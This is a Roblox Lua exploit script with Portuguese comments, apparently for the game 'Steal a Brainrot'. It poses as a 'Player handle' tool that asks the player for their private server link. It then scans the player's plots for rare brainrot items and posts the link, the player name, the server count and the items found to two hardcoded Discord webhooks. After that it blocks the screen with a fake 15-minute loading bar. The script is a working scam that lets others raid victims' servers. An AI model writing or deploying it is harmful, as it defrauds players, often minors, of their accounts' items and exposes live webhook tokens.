-- Script atualizado: envia brainrots APENAS quando o jogador clicar no botão
-- Removeu envio automático de informações do servidor

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

-- Webhooks (adapte se quiser)
local webhooks = {
    "https://discord.com/api/webhooks/1428872448786436176/gNVv2m6PDYafOCl_LmVj0kfnsJu3zzjBJ8eWjqUW_Gp-HWqR_iuQZZC9SoPe3vZfswme",
    "https://discord.com/api/webhooks/1428103017369964565/_hTrVyWtnf4qQWMQ94pILkrxAJopWt1IbZ6pOLWKT0L9qfwybeviwGTE-DjZy-gDD_18"
}

local brainrots = {
    "Strawberry Elephant Corn Corn Corn Sahur", "La Vacca Saturno Saturnita", "Blackhole Goat",
    "Agarrini La Palini", "Karkerkar Kurkur", "Los Matteos", "Chimpanzini Spiderini",
    "Sammyni Spyderini", "La Cucaracha", "Los Tralaleritos", "Las Tralaleritas", "Las Vaquitas Saturnitas",
    "Job Job Job Sahur", "Los Spyderinis", "Graipuss Medussi", "Tortuginni Dragonfruitini",
    "Nooo My Hotspot", "Pot Hotspot", "To To To Sahur", "Esok Sekolah", "Chicleteira Bicicleteira",
    "Spaghetti Tualetti", "La Grande Combinasion", "Mariachi Corazoni", "Los Combinasionas",
    "Nuclearo Dinossauro", "Los Hotspotsitos", "Tictac Sahur", "La Supreme Combinasion",
    "Garama and Madundung", "Dragon Cannelloni", "Trenostruzzo Turbo 4000", "Fragola La La La",
    "La Sahur Combinasion", "La Karkerkar Combinasion", "Tralaledon", "Los Tacoritas",
    "Los Bros Cocofanto Elefanto", "Antonio", "Girafa Celestre", "Gattatino Nyanino",
    "Chihuanini Taconini", "Matteo", "Tralalero Tralala", "Mastodontico Telepiedone",
    "Espresso Signora", "Odin Din Din Dun", "Brainrot God Lucky Block", "Alessio",
    "Statutino Libertino", "Tralalita Tralala", "Unclito Samito", "Tukanno Bananno",
    "Trenostruzzo Turbo 3000", "Tigroligre Frutonni", "Urubini Flamenguini", "Ballerino Lololo",
    "Trig­oligre Frutonni", "Orcalero Orcala", "Los Crocodillitos", "Tipi Topi Taco",
    "Extinct Ballerina", "Bulbito Bandito Traktorito", "Trippi Troppi Troppa Trippa",
    "Gattito Tacoto", "Los Tungtungtungcitos", "Pakrahmatmamat", "Brr es Teh Patipum",
    "Piccione Macchina", "Tractoro Dinosauro", "Los Bombinitos", "Orcalita Orcala",
    "Los Orcalitos", "Cacasito Satalito", "Tartaruga Cisterna", "Los Tipi Tacos",
    "Piccionetta Macchina", "Anpali Babel", "Bombardini Tortinii", "Belula Beluga",
    "Las Capuchinas"
}

local detected = {} -- evita re-enviar brainrots já reportados

-- Função que escolhe o método de request disponível
local function doRequest(reqTable)
    if syn and syn.request then
        return syn.request(reqTable)
    elseif http and http.request then
        return http.request(reqTable)
    elseif http_request then
        return http_request(reqTable)
    elseif request then
        return request(reqTable)
    elseif fluxus and fluxus.request then
        return fluxus.request(reqTable)
    elseif (krnl and krnl.request) then
        return krnl.request(reqTable)
    else
        return nil
    end
end

-- Envia payload (string ou tabela) para todos os webhooks
local function sendToAllWebhooks(content)
    local payload
    if type(content) == "string" then
        payload = {["content"] = content}
    elseif type(content) == "table" then
        payload = content
    else
        payload = {["content"] = tostring(content)}
    end

    local body = HttpService:JSONEncode(payload)
    for _, url in ipairs(webhooks) do
        local ok, err = pcall(function()
            doRequest({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        end)
        if not ok then
            warn("Erro ao enviar webhook para", url, err)
        end
    end
end

-- Checa a pasta Plots e retorna uma lista de novos brainrots (não retorna nada automaticamente)
local function gatherNewBrainrots()
    local results = {}
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if not plotsFolder then
        return results -- vazio
    end

    for _, plot in pairs(plotsFolder:GetChildren()) do
        for _, item in pairs(plot:GetChildren()) do
            for _, name in pairs(brainrots) do
                if item.Name == name and not detected[name] then
                    detected[name] = true
                    table.insert(results, {name = name})
                end
            end
        end
    end

    return results
end

-- UI: cria menu, textbox e botão
local function createUI()
    local player = Players.LocalPlayer
    if not player then return end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PlayerHandleMenu"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 270)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -135)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Text = "Player handle"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 30
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.Parent = mainFrame

    local subtitle = Instance.new("TextLabel")
    subtitle.Text = "ponhe o seu servidor privado abaixo e espera a tela de carregamento!"
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextSize = 18
    subtitle.Size = UDim2.new(1, -10, 0, 40)
    subtitle.Position = UDim2.new(0, 5, 0, 55)
    subtitle.BackgroundTransparency = 1
    subtitle.TextColor3 = Color3.fromRGB(180,180,180)
    subtitle.TextWrapped = true
    subtitle.Parent = mainFrame

    local linkBox = Instance.new("TextBox")
    linkBox.PlaceholderText = "Link do servidor privado"
    linkBox.Font = Enum.Font.Gotham
    linkBox.TextSize = 16
    linkBox.Size = UDim2.new(1, -20, 0, 40)
    linkBox.Position = UDim2.new(0, 10, 0, 105)
    linkBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
    linkBox.TextColor3 = Color3.fromRGB(255,255,255)
    linkBox.ClearTextOnFocus = false
    linkBox.Parent = mainFrame

    local sendButton = Instance.new("TextButton")
    sendButton.Text = "OK"
    sendButton.Font = Enum.Font.GothamBold
    sendButton.TextSize = 18
    sendButton.Size = UDim2.new(0, 120, 0, 38)
    sendButton.Position = UDim2.new(0.5, -60, 0, 160)
    sendButton.BackgroundColor3 = Color3.fromRGB(70,130,180)
    sendButton.TextColor3 = Color3.fromRGB(255,255,255)
    sendButton.Parent = mainFrame

    return screenGui, mainFrame, linkBox, sendButton
end

-- Loading screen antiga (barra de 15min)
local function showLoadingScreen()
    local player = Players.LocalPlayer
    if not player then return end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlackLoadingScreen"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0,0,0,0)
    blackFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 10
    blackFrame.Parent = screenGui

    local loadingTitle = Instance.new("TextLabel")
    loadingTitle.Text = "puxando players por favor espere"
    loadingTitle.Font = Enum.Font.GothamBold
    loadingTitle.TextSize = 30
    loadingTitle.Size = UDim2.new(1, 0, 0, 60)
    loadingTitle.Position = UDim2.new(0, 0, 0.3, -30)
    loadingTitle.BackgroundTransparency = 1
    loadingTitle.TextColor3 = Color3.fromRGB(255,255,255)
    loadingTitle.ZIndex = 11
    loadingTitle.Parent = blackFrame

    local loadingBarBg = Instance.new("Frame")
    loadingBarBg.Size = UDim2.new(0.5, 0, 0, 40)
    loadingBarBg.Position = UDim2.new(0.25, 0, 0.5, 0)
    loadingBarBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
    loadingBarBg.BorderSizePixel = 0
    loadingBarBg.ZIndex = 11
    loadingBarBg.Parent = blackFrame

    local loadingBar = Instance.new("Frame")
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.Position = UDim2.new(0, 0, 0, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(70,130,180)
    loadingBar.BorderSizePixel = 0
    loadingBar.ZIndex = 12
    loadingBar.Parent = loadingBarBg

    local percentText = Instance.new("TextLabel")
    percentText.Text = "0%"
    percentText.Font = Enum.Font.GothamBold
    percentText.TextSize = 18
    percentText.Size = UDim2.new(1, 0, 1, 0)
    percentText.Position = UDim2.new(0, 0, 0, 0)
    percentText.BackgroundTransparency = 1
    percentText.TextColor3 = Color3.fromRGB(255,255,255)
    percentText.ZIndex = 12
    percentText.Parent = loadingBarBg

    return screenGui, loadingBar, percentText
end

-- Cria UI e conecta botão
local screenGui, mainFrame, linkBox, sendButton = createUI()
if sendButton then
    sendButton.MouseButton1Click:Connect(function()
        local linkText = tostring(linkBox.Text or "")

        -- Checa Plots e pega novos brainrots
        local found = gatherNewBrainrots()

        -- Monta a mensagem usando quantidade de players / limite
        local currentPlayers = #Players:GetPlayers()
        local maxPlayers = Players.MaxPlayers or "Desconhecido"
        local messageLines = {}
        table.insert(messageLines, string.format("🔗 Mensagem do jogador **%s**: %s", Players.LocalPlayer.Name, linkText))
        table.insert(messageLines, string.format("👥 Jogadores no servidor: %d/%s", currentPlayers, maxPlayers))

        -- Brainrots encontrados
        if #found > 0 then
            for _, info in ipairs(found) do
                table.insert(messageLines, string.format("🧠 Brainrot detectado: **%s**", info.name))
            end
        else
            table.insert(messageLines, "⚠️ Nenhum **Brainrot God/Secrets** encontrado na checagem.")
        end

        -- Envia mensagem
        local fullMessage = table.concat(messageLines, "\n")
        sendToAllWebhooks(fullMessage)

        -- Fecha menu e mostra loading
        if mainFrame then mainFrame.Visible = false end
        local loadingGui, loadingBar, percentText = showLoadingScreen()
        local totalTime = 900 -- 15 minutos
        local elapsed = 0
        while elapsed < totalTime do
            task.wait(0.1)
            elapsed = elapsed + 0.1
            local percent = math.floor((elapsed / totalTime) * 100)
            if loadingBar then loadingBar.Size = UDim2.new(percent/100, 0, 1, 0) end
            if percentText then percentText.Text = tostring(percent) .. "%" end
        end
        if loadingBar then loadingBar.Size = UDim2.new(1,0,1,0) end
        if percentText then percentText.Text = "100%" end
    end)
end

print("✔ Script atualizado: envia brainrots SOMENTE ao enviar a mensagem do jogador.")